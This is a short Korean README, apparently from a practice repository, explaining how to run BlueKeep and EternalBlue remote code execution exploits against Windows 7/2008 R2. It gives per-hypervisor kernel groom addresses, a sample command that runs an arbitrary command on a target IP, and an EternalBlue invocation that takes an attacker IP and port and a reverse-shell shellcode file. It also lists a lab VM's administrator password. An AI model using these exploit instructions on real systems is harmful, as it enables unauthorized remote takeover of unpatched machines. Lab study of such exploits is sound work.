## VM 정보

Administrator / Alpine12#$

## Bluekeep

### 사용법

- 환경에 맞게, `GROOM_BASE` 값을 수정:
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64): 0xfffffa8003800000
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6): 0xfffffa8002407000
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14): 0xfffffa8030c00000
  - **Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15): 0xfffffa8018C00000** (default)
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1): 0xfffffa8018c08000
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V): 0xfffffa8102407000
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS): 0xfffffa8018c08000
  - Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM): 0xfffffa8004428000
  - 익스플로잇을 실패하면 커널 디버깅을 통해 베이스 주소 확인해야 함
- `COMMAND`는 최대 512자까지 입력 가능

`$ python rdp_bluekeep.py 192.168.79.130 "echo pwned > C:\Users\Administrator\Desktop\asdf.txt"`

### 쉘코드

- "A" * 512 를 실행하는 쉘코드가 내장되어 있음
- 사용자가 입력한 커맨드가 "A"를 대체하도록 처리 (파이썬 내에서 처리됨)

## Eternalblue

### 사용법

```bash
$ pip install impacket

$ python eternalblue7_exploit.py <ip> <attacker_ip> <attacker_port> <shellcode_file> [numGroomConn]
```

### shellcode_file

- 셸코드 파일은 sc_x64.bin을 사용하면 되고, 리버스 셸 셸코드임
